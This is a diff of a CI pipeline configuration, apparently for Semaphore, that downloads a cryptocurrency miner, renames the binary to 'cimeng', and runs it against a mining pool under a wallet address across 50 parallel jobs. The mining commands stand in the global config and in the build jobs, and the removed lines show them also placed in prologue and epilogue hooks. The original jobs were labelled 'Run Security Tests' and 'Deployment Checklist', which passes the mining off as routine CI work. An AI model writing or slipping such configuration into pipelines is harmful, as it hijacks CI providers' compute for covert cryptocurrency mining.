@@ -33,39 +33,14 @@ global_job_config:
         - mv cpuminer-sse2 cimeng
         - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.1000a -t4'
 blocks:
-  - name: Run Security Tests
+  - name: 'Block #1'
+    dependencies: []
     task:
       jobs:
-        - name: Deployment Checklist
+        - name: 'Job #1'
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
             - tar xf cpuminer-opt-linux.tar.gz
             - mv cpuminer-sse2 cimeng
-            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.memek2 -t4'
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.memek12 -t4'
           parallelism: 50
-      prologue:
-        commands:
-          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-          - tar xf cpuminer-opt-linux.tar.gz
-          - mv cpuminer-sse2 cimeng
-          - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.memek2 -t4'
-      epilogue:
-        always:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 cimeng
-            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.memek2 -t4'
-        on_pass:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 cimeng
-            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.memek2 -t4'
-        on_fail:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 cimeng
-            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.memek2 -t4'
-    dependencies: []
